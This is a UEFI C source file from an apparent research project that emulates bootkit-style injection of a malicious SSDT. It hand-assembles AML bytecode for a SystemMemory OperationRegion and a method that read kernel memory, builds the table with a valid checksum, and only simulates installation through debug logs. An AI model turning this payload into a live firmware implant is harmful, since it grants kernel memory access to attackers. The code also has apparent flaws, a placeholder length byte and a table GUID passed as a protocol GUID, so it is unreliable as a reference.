/** @file
  ACPI Table Injection Emulation - Implementation

  Emulates malicious SSDT injection with AML bytecode containing
  OperationRegion(SystemMemory) definitions. Models how a bootkit can install
  custom ACPI tables to gain kernel memory access post-boot.

  All operations are SIMULATED - no actual ACPI tables are modified.

  Copyright (c) 2026, Barzakh Research Project
  SPDX-License-Identifier: BSD-2-Clause-Patent
**/

#include "AcpiTableInject.h"

STATIC ACPI_INJECT_CONTEXT  mAcpiContext;

//
// Simulated AML payload: OperationRegion + Field + Method
// This represents a minimal SSDT body that creates a SystemMemory
// OperationRegion for reading/writing kernel memory.
//
STATIC UINT8  mAmlPayload[] = {
  // Scope (\_SB)
  AML_SCOPE_OP,
  0x40, 0x00,                         // PkgLength (placeholder - 64 bytes)
  '\\', '_', 'S', 'B', '_',          // NameString: \_SB_

  // OperationRegion (KMEM, SystemMemory, 0xFFFFF80000000000, 0x1000)
  AML_EXT_PREFIX, AML_EXT_OPREGION_OP,
  'K', 'M', 'E', 'M',               // NameString: KMEM
  AML_REGION_SYSTEM_MEMORY,           // RegionSpace: SystemMemory
  AML_QWORD_PREFIX,                   // Offset - QWord
  0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF,  // 0xFFFFF80000000000 (kernel space)
  AML_DWORD_PREFIX,                   // Length - DWord
  0x00, 0x10, 0x00, 0x00,            // 0x1000 (4KB)

  // Field (KMEM, AnyAcc, NoLock, Preserve)
  AML_EXT_PREFIX, AML_FIELD_OP,
  0x13, 0x00,                         // PkgLength
  'K', 'M', 'E', 'M',               // OperationRegion name
  0x01,                               // FieldFlags: AnyAcc | NoLock | Preserve
  // PATC, 64 (8 bytes at offset 0 for patching)
  'P', 'A', 'T', 'C', 0x00, 0x40,

  // Method (MPAT, 0, Serialized) { Return (PATC) }
  AML_METHOD_OP,
  0x09,                               // PkgLength
  'M', 'P', 'A', 'T',               // NameString
  0x08,                               // ArgCount=0, Serialized
  AML_RETURN_OP,
  'P', 'A', 'T', 'C'                // Return PATC field
};

STATIC
UINT8
CalculateAcpiChecksum (
  IN UINT8   *Buffer,
  IN UINT32  Size
  )
{
  UINT8   Sum;
  UINT32  Index;

  Sum = 0;
  for (Index = 0; Index < Size; Index++) {
    Sum = (UINT8)(Sum + Buffer[Index]);
  }

  return (UINT8)(0 - Sum);
}

EFI_STATUS
EFIAPI
InitializeAcpiInject (
  OUT ACPI_INJECT_CONTEXT  *Context
  )
{
  ZeroMem (Context, sizeof (ACPI_INJECT_CONTEXT));
  Context->Initialized = TRUE;
  Context->State = AcpiStateUninitialized;
  Context->TargetRegionBase = 0xFFFFF80000000000ULL;
  Context->TargetRegionSize = 0x1000;

  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "Initialized (SIMULATION_MODE=%d)\n", SIMULATION_MODE));
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
LocateAcpiProtocol (
  IN OUT ACPI_INJECT_CONTEXT  *Context
  )
{
  if (!Context->Initialized) {
    return EFI_NOT_READY;
  }

  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "Locating EFI_ACPI_TABLE_PROTOCOL...\n"));

  if (SIMULATION_MODE) {
    Context->ProtocolFound = TRUE;
    Context->AcpiProtocol = NULL;
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  Protocol located [SIMULATED]\n"));
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  ACPI 2.0 table GUID present in config table\n"));
  } else {
    EFI_STATUS  Status;
    VOID        *Protocol;

    Status = gBS->LocateProtocol (
                    &gEfiAcpi20TableGuid,
                    NULL,
                    &Protocol
                    );
    if (EFI_ERROR (Status)) {
      DEBUG ((DEBUG_WARN, ACPI_DEBUG_PREFIX "  ACPI protocol not found: %r\n", Status));
      Context->ProtocolFound = FALSE;
      Context->State = AcpiStateProtocolLocated;
      return EFI_SUCCESS;
    }

    Context->ProtocolFound = TRUE;
    Context->AcpiProtocol = Protocol;
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  Protocol located (live)\n"));
  }

  Context->State = AcpiStateProtocolLocated;
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
ConstructMaliciousSsdt (
  IN OUT ACPI_INJECT_CONTEXT  *Context
  )
{
  EFI_ACPI_DESCRIPTION_HEADER  *SsdtHeader;
  UINT32                       HeaderSize;

  if (Context->State < AcpiStateProtocolLocated) {
    return EFI_NOT_READY;
  }

  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "Constructing malicious SSDT...\n"));

  HeaderSize = sizeof (EFI_ACPI_DESCRIPTION_HEADER);
  Context->AmlPayloadSize = sizeof (mAmlPayload);
  Context->SsdtSize = HeaderSize + Context->AmlPayloadSize;

  if (Context->SsdtSize > MAX_SSDT_SIZE) {
    DEBUG ((DEBUG_ERROR, ACPI_DEBUG_PREFIX "  SSDT too large: %d > %d\n",
            Context->SsdtSize, MAX_SSDT_SIZE));
    return EFI_BUFFER_TOO_SMALL;
  }

  Context->SsdtBuffer = AllocateZeroPool (Context->SsdtSize);
  if (Context->SsdtBuffer == NULL) {
    return EFI_OUT_OF_RESOURCES;
  }

  SsdtHeader = (EFI_ACPI_DESCRIPTION_HEADER *)Context->SsdtBuffer;
  SsdtHeader->Signature = SSDT_SIGNATURE;
  SsdtHeader->Length = Context->SsdtSize;
  SsdtHeader->Revision = 2;
  CopyMem (SsdtHeader->OemId, SSDT_OEM_ID, 6);
  SsdtHeader->OemTableId = SSDT_OEM_TABLE_ID;
  SsdtHeader->OemRevision = SSDT_OEM_REVISION;
  SsdtHeader->CreatorId = SSDT_CREATOR_ID;
  SsdtHeader->CreatorRevision = SSDT_CREATOR_REVISION;

  CopyMem (Context->SsdtBuffer + HeaderSize, mAmlPayload, Context->AmlPayloadSize);

  SsdtHeader->Checksum = 0;
  SsdtHeader->Checksum = CalculateAcpiChecksum (Context->SsdtBuffer, Context->SsdtSize);

  Context->SsdtReady = TRUE;

  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  SSDT Header:\n"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "    Signature:  SSDT\n"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "    Length:     %d bytes\n", Context->SsdtSize));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "    Revision:   2\n"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "    OemId:      %a\n", SSDT_OEM_ID));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "    Checksum:   0x%02x (valid)\n", SsdtHeader->Checksum));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  AML Payload:\n"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "    Size:       %d bytes\n", Context->AmlPayloadSize));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "    Contains:   OperationRegion(KMEM, SystemMemory)\n"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "    Target:     0x%016lx (%d bytes)\n",
          Context->TargetRegionBase, Context->TargetRegionSize));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "    Method:     MPAT - reads kernel memory via PATC field\n"));

  Context->State = AcpiStateSsdtConstructed;
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
EmulateTableInstallation (
  IN OUT ACPI_INJECT_CONTEXT  *Context
  )
{
  if (Context->State < AcpiStateSsdtConstructed) {
    return EFI_NOT_READY;
  }

  if (!Context->SsdtReady) {
    return EFI_NOT_READY;
  }

  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "Emulating ACPI table installation...\n"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  Calling AcpiTable->InstallAcpiTable()\n"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  Table: SSDT, Size: %d bytes\n", Context->SsdtSize));

  if (SIMULATION_MODE) {
    Context->TableKey = 0x42;
    Context->TableInstalled = TRUE;
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  → Table installed, Key=0x%lx [SIMULATED]\n",
            Context->TableKey));
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  → SSDT visible to OS ACPI interpreter\n"));
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  → OperationRegion KMEM now accessible via \\_SB.KMEM\n"));
  }

  Context->State = AcpiStateTableInstalled;
  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
EmulateAmlExecution (
  IN OUT ACPI_INJECT_CONTEXT  *Context
  )
{
  if (Context->State < AcpiStateTableInstalled) {
    return EFI_NOT_READY;
  }

  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "Emulating AML payload execution...\n"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  OS ACPI interpreter loads SSDT\n"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  Evaluates Scope(\\_SB_)...\n"));

  if (SIMULATION_MODE) {
    Context->OperationRegionCreated = TRUE;
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  → OperationRegion KMEM created:\n"));
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "      Type:   SystemMemory\n"));
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "      Base:   0x%016lx\n", Context->TargetRegionBase));
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "      Size:   0x%x\n", Context->TargetRegionSize));
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  → Field PATC: 64-bit access at offset 0\n"));
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  → Method MPAT: Returns PATC (kernel memory read)\n"));
    DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  → Attack surface: any ACPI method call can now R/W kernel\n"));
  }

  Context->State = AcpiStatePayloadActive;
  return EFI_SUCCESS;
}

VOID
EFIAPI
LogAcpiInjectStatus (
  IN     ACPI_INJECT_CONTEXT  *Context
  )
{
  CHAR8  *StateStr;

  switch (Context->State) {
    case AcpiStateUninitialized:    StateStr = "Uninitialized"; break;
    case AcpiStateProtocolLocated:  StateStr = "Protocol Located"; break;
    case AcpiStateSsdtConstructed:  StateStr = "SSDT Constructed"; break;
    case AcpiStateTableInstalled:   StateStr = "Table Installed"; break;
    case AcpiStatePayloadActive:    StateStr = "Payload Active"; break;
    default:                        StateStr = "Unknown"; break;
  }

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "=== ACPI Table Injection Status ===\n"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  State:          %a\n", StateStr));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  Protocol:       %a\n",
          Context->ProtocolFound ? "Found" : "Not found"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  SSDT Ready:     %a\n",
          Context->SsdtReady ? "Yes" : "No"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  SSDT Size:      %d bytes\n", Context->SsdtSize));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  Table Installed:%a (Key=0x%lx)\n",
          Context->TableInstalled ? "Yes" : "No", Context->TableKey));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  OpRegion:       %a\n",
          Context->OperationRegionCreated ? "Active" : "Inactive"));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "  Target Region:  0x%016lx (0x%x bytes)\n",
          Context->TargetRegionBase, Context->TargetRegionSize));
  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "====================================\n\n"));
}

EFI_STATUS
EFIAPI
AcpiTableInjectEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS  Status;

  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "Module loaded - ACPI Table Injection Emulation\n"));

  Status = InitializeAcpiInject (&mAcpiContext);
  if (EFI_ERROR (Status)) {
    return Status;
  }

  Status = LocateAcpiProtocol (&mAcpiContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, ACPI_DEBUG_PREFIX "Protocol location failed: %r\n", Status));
    return Status;
  }

  Status = ConstructMaliciousSsdt (&mAcpiContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, ACPI_DEBUG_PREFIX "SSDT construction failed: %r\n", Status));
    return Status;
  }

  Status = EmulateTableInstallation (&mAcpiContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_ERROR, ACPI_DEBUG_PREFIX "Table installation failed: %r\n", Status));
    return Status;
  }

  Status = EmulateAmlExecution (&mAcpiContext);
  if (EFI_ERROR (Status)) {
    DEBUG ((DEBUG_WARN, ACPI_DEBUG_PREFIX "AML execution emulation: %r\n", Status));
  }

  LogAcpiInjectStatus (&mAcpiContext);

  if (mAcpiContext.SsdtBuffer != NULL) {
    FreePool (mAcpiContext.SsdtBuffer);
    mAcpiContext.SsdtBuffer = NULL;
  }

  DEBUG ((DEBUG_INFO, ACPI_DEBUG_PREFIX "Emulation complete\n"));
  return EFI_SUCCESS;
}
